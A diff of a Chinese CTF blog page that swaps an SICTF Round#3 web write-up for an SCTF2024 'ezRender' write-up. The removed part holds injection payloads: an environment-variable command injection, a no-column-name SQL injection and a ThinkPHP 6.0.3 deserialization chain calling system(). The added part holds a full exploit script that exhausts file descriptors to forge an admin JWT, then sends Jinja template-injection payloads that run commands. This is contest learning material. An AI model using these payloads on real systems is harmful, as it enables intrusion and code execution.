@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      SICTF Round#3 | Infernity&#39;s Blog
+      SCTF2024 ezRender | Infernity&#39;s Blog
     
   </title>
   <meta name="author" content="Infernity">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「SICTF Round#3」
+			「SCTF2024 ezRender」
 		
 	</p>
 
@@ -246,8 +246,8 @@
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2024/02/17/SICTF-Round3/" itemprop="url">
-		SICTF Round#3
+	<a href="/2024/10/07/SCTF2024/" itemprop="url">
+		SCTF2024 ezRender
 	</a>
 
 		</div>
@@ -263,9 +263,9 @@
 
 	更新于
 
-	<a href="/2024/02/17/SICTF-Round3/" itemprop="url">
-		<time datetime="2024-02-17T08:19:35.000Z" itemprop="dateUpdated">
-	  		2024-06-18
+	<a href="/2024/10/07/SCTF2024/" itemprop="url">
+		<time datetime="2024-10-07T11:00:56.000Z" itemprop="dateUpdated">
+	  		2024-10-17
 	  </time>
 	</a> 
 
@@ -286,7 +286,7 @@
 			
 
 	
-    <span class="leancloud_visitors" id="/2024/02/17/SICTF-Round3/_visitors" data-url="/2024/02/17/SICTF-Round3/" data-title="SICTF Round#3">
+    <span class="leancloud_visitors" id="/2024/10/07/SCTF2024/_visitors" data-url="/2024/10/07/SCTF2024/" data-title="SCTF2024 ezRender">
        	<i class="icon-eye"></i>
        	热度
         
@@ -298,7 +298,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2024/02/17/SICTF-Round3/_likes" data-url="/2024/02/17/SICTF-Round3/" data-title="SICTF Round#3" rel="unlike">
+    <span class="leancloud_likes" id="/2024/10/07/SCTF2024/_likes" data-url="/2024/10/07/SCTF2024/" data-title="SCTF2024 ezRender" rel="unlike">
         <i class="icon-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -308,58 +308,23 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<p>by:Infernity</p>
-<h1 id="100％-upload"><a href="#100％-upload" class="headerlink" title="100％_upload"></a>100％_upload</h1><p>可真气死我了这道题，没注意看url，跟着标题走，一直在文件上传，一直在绕过滤，他要过滤也不过滤全，留个.user.ini没过滤，就一直围绕这个想办法，结果……</p>
-<p><img src="/img/SICTF2024/1.png" alt="图片.png"></p>
-<p>打开题目，很明显的提示，index.php里有Include函数，那么我们直接上传一个jpg马，然后包含他就出来了。</p>
-<p><img src="/img/SICTF2024/2.png" alt="图片.png"></p>
-<p><strong>SICTF{ea391e30-b67e-4a5d-97ca-7c00f1bc107b}</strong> </p>
-<h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><p>新知识点，利用环境变量注入。</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189733.html">https://www.cnblogs.com/h0cksr/p/16189733.html</a></p>
-<p>前面的反序列化这里不再赘述。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>=<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    worries&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome=<span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year=<span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year-&gt;last=<span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+			<h1 id="ezRender"><a href="#ezRender" class="headerlink" title="ezRender"></a>ezRender</h1><p>这道题主要是成为admin，要成为admin就要伪造cookie，要伪造cookie就要获取jwt密钥。</p>
+<p>jwt密钥生成逻辑：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,password</span>):</span><br><span class="line">        self.name=name</span><br><span class="line">        self.pwd = password</span><br><span class="line">        self.Registertime=<span class="built_in">str</span>(time.time())[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">        self.handle=<span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        self.secret=self.setSecret()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handler</span>(<span class="params">self</span>):</span><br><span class="line">        self.handle = <span class="built_in">open</span>(<span class="string">&quot;/dev/random&quot;</span>, <span class="string">&quot;rb&quot;</span>)     <span class="comment">#从/dev/random文件获取一个随机数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setSecret</span>(<span class="params">self</span>):</span><br><span class="line">        secret = self.Registertime     <span class="comment">#获取当前时间</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.handle == <span class="literal">None</span>:</span><br><span class="line">                self.handler()</span><br><span class="line">            secret += <span class="built_in">str</span>(self.handle.read(<span class="number">22</span>).<span class="built_in">hex</span>())  <span class="comment">#key是时间+随机数</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;this file is not exist or be removed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> secret</span><br></pre></td></tr></table></figure>
 
-<p>&#x2F;^.<em>(worries).</em>$&#x2F;</p>
-<p>这个可以在前面加个空格绕过。</p>
-<p>主要是这一段：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>
+<p>时间很好搞定，随机数咋办呢？</p>
+<p>原本我的理解是<strong>通过不断向&#x2F;dev&#x2F;random发送随机数请求，用光熵，它就不会生成随机数了。</strong>这里歪打正着了。</p>
+<p>但其实后面出题人给了提示：<code>ulimit -n =2048</code></p>
+<p>这个值是linux中限制打开文件数量的，也就是说，我每次创建一个新用户，就会打开一次&#x2F;dev&#x2F;random，而这里open没close，文件并不会关闭。一直创建新用户直到两千多个用户时，代码就会因为文件打开数量的限制，而无法打开&#x2F;dev&#x2F;random，也就无法获取随机数，从而这个用户的jwt key只有时间了，我们也就可以把它的身份改成admin从而执行后面的行动。</p>
+<p>在admin路由，可以渲染模版，像49这种纯字符型的模版可以成功渲染，但是需要渲染“高级”一点的代码就不行了，这是因为之前把文件打开数量塞满了，渲染模版的时候需要新打开一个文件，这就导致了阻塞，我们需要删除一些用户，然后来释放一些文件，好让我们的模版可以成功渲染。</p>
+<p>这个题还不出网弹不了shell，内存马没写成功&#x3D;-&#x3D;</p>
+<p>一键获得flag exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1.95.87.193:39451&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#register</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>+<span class="built_in">str</span>(i),<span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">    resregister = requests.post(url+<span class="string">&#x27;/register&#x27;</span>,json=data)</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(resregister.text)</span><br><span class="line">    timekey = <span class="built_in">str</span>(time.time())[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">    <span class="built_in">print</span>(timekey)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#login获取cookie</span></span><br><span class="line">    reslogin = requests.post(url+<span class="string">&#x27;/login&#x27;</span>,json=data)</span><br><span class="line">    token = json.loads(base64.b64decode(reslogin.cookies[<span class="string">&#x27;Token&#x27;</span>]))</span><br><span class="line">    secret = token[<span class="string">&#x27;secret&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(secret)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 解码</span></span><br><span class="line">        decrypt_infor = jwt.decode(secret, timekey, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(decrypt_infor)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#输出加密后的cookie</span></span><br><span class="line">        secret1 = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;admin&quot;</span>+<span class="built_in">str</span>(i), <span class="string">&quot;is_admin&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">        verify_c = jwt.encode(secret1, timekey, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        infor = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;admin&quot;</span>+<span class="built_in">str</span>(i), <span class="string">&quot;secret&quot;</span>: verify_c&#125;</span><br><span class="line">        token1 = base64.b64encode(json.dumps(infor).encode()).decode()</span><br><span class="line">        <span class="built_in">print</span>(token1)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除user，释放占用的文件</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>+<span class="built_in">str</span>(j)&#125;</span><br><span class="line">    res = requests.post(url+<span class="string">&#x27;/removeUser&#x27;</span>,data=data,cookies=&#123;<span class="string">&quot;Token&quot;</span>:token1&#125;)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;&#123;&#123;x.__init__.__globals__.__getitem__(&#x27;__builtins__&#x27;).__getitem__(&#x27;ex&#x27;&#x27;ec&#x27;)(\&quot;setattr(__import__(&#x27;sys&#x27;).modules.__getitem__(&#x27;__main__&#x27;).__dict__.__getitem__(&#x27;APP&#x27;.lower()),&#x27;_static_folder&#x27;,&#x27;/&#x27;)\&quot;)&#125;&#125;&quot;</span>&#125;   <span class="comment">#将static目录污染到根目录</span></span><br><span class="line">requests.post(url+<span class="string">&#x27;/admin&#x27;</span>,data=data,cookies=&#123;<span class="string">&quot;Token&quot;</span>:token1&#125;)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;&#123;&#123;g.pop.__globals__.__builtins__.__import__(&#x27;OS&#x27;.lower()).popen(&#x27;/readflag 2&gt;&amp;1 1&gt;/tmp/res.txt&#x27;).read()&#125;&#125;&quot;</span>&#125;    <span class="comment">#由于它关闭了标准输出，这里将错误输出从定向到res.txt</span></span><br><span class="line">requests.post(url+<span class="string">&#x27;/admin&#x27;</span>,data=data,cookies=&#123;<span class="string">&quot;Token&quot;</span>:token1&#125;)</span><br><span class="line"></span><br><span class="line">res = requests.get(url+<span class="string">&#x27;/static/tmp/res.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
 
-<p>这里环境变量注入要看看上面的文章，有点复杂。</p>
-<p>这里直接get[BASH_FUNC_echo%%]&#x3D;() { cat &#x2F;f*; }</p>
-<p>即可拿到flag。</p>
-<h1 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h1><p>这道题考查sql无列名注入。</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46230316/article/details/106668182">https://blog.csdn.net/m0_46230316/article/details/106668182</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)/**/as/**/a%23</span><br></pre></td></tr></table></figure>
-
-<p>过滤了空格，经过测试，一共有两列，而flag肯定在第二列，所以是<code>2</code></p>
-<p><strong>SICTF{4fa6acc5-9d2c-4af8-908c-53b66839b019}</strong></p>
-<h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><p>他说有另一个文件，直接开扫！找到一个admin.php，进去看看</p>
-<p><img src="/img/SICTF2024/3.png" alt="图片.png"></p>
-<p>意思是我们需要把ip改成127.0.0.1</p>
-<p>这里正好原文里给了curl</p>
-<p><img src="/img/SICTF2024/4.png" alt="图片.png"></p>
-<p>那直接以127.0.0.1开头进去就拿到flag了。</p>
-<p>O:6:”client”:1:{s:3:”url”;s:26:”<a target="_blank" rel="noopener" href="http://127.0.0.1/admin.php%22;%7D">http://127.0.0.1/admin.php&quot;;}</a></p>
-<p>最后base64解密</p>
-<p><img src="/img/SICTF2024/5.png" alt="图片.png"></p>
-<p><strong>SICTF{af8d34d5-22c4-414d-a78e-b65f587712f5}</strong></p>
-<h1 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h1><p>最讨厌藏东西的题了，开局先扫，扫出来一个<a target="_blank" rel="noopener" href="http://www.zip这是网站备份文件,里面会有源码,在app/controller/%E9%87%8C%E6%89%BE%E5%88%B0%E6%BA%90%E7%A0%81%EF%BC%8C%E5%AE%A1%E8%AE%A1%E6%BA%90%E7%A0%81%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AD%A5">www.zip这是网站备份文件，里面会有源码，在app/controller/里找到源码，审计源码，第一步</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$right</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;left&#x27;</span>];</span><br><span class="line"><span class="variable">$left</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;right&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$right</span> !== <span class="variable">$left</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$right</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$left</span>))&#123;</span><br></pre></td></tr></table></figure>
-
-<p>传?left&#x3D;240610708&amp;right&#x3D;QLTHNDT</p>
-<p>第二步</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;603THINKPHP&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;！！！Oysters don&#x27;t want you to eat！！！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>一般只有一个preg_match的判断，里面是一个die函数，用回溯次数绕过可以解，下面stripos函数需要我们的参数里有603THINKPHP，所以传一百万个a+603THINKPHP即可。</p>
-<p>第三步就是反序列化了，这是thinkphp6.0.3有现成的poc，在网上一搜第一个就是</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"> <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>];</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;&#125;</span><br><span class="line"> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
-
-<p>post传参拿到flag</p>
-<p><strong>SICTF{c35c6cef-3fbb-41d3-9a53-1191b957a9f1}</strong></p>
 	
 		</div>
 		
-		<div id="current-post-cover" data-scr="/img/background/2.jpg"></div>
+		<div id="current-post-cover" data-scr="/img/SCTF2024/SCTF2024.jpg"></div>
 
 		<!-- relate post, comment...-->
 		<div class="investment-container">
@@ -374,12 +339,8 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2024/02/20/Hgame-2024-week-4/" title="Hgame 2024 week 4" rel="prev">
-				&laquo;上一篇
-			</a>
 		
-		
-			<a href="/2024/02/17/VNCTF%202024/" title="VNCTF 2024" rel="next">
+			<a href="/2024/09/21/ByteCTF2024%E5%A4%A7%E5%B8%88%E8%B5%9B/" title="ByteCTF2024大师赛web部分wp" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -397,30 +358,6 @@
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">
-								SCTF2024 ezRender			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								十月 7日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezRender这道题主要是成为admin，要成为admin就要伪造cookie，要伪造cookie就要获取jwt密钥。
-jwt密钥生成逻辑：
-123456789101112131415161718192021import timec...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/10/07/SCTF2024/" title="SCTF2024 ezRender">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/SCTF2024/SCTF2024.jpg" alt="SCTF2024 ezRender"/>
-							</a>
-						</div>
-					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -652,6 +589,34 @@ flag{72077a55w312584wb1aaa88888cd...
 							<a href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/" title="DASCTF2024校赛">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/DASCTF2024校赛/2024dasctf.png" alt="DASCTF2024校赛"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/04/09/XYCTF2024/" title="XYCTF2024">
+								XYCTF2024			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 9日, 2024				
+							</p>
+							<p class="relate-post-content">
+								ezhttp打开是登录页面，先看源码，源码提示：
+1&lt;!-- 为了防止忘记密码，我把它们放在某个地方了 --&gt;
+
+第一反应是robots.txt，进去看看。
+
+得到&#x2F;l0g1n.txt，进入得到帐号密码：
+12u...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/04/09/XYCTF2024/" title="XYCTF2024">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="XYCTF2024"/>
 							</a>
 						</div>
 					</li>												
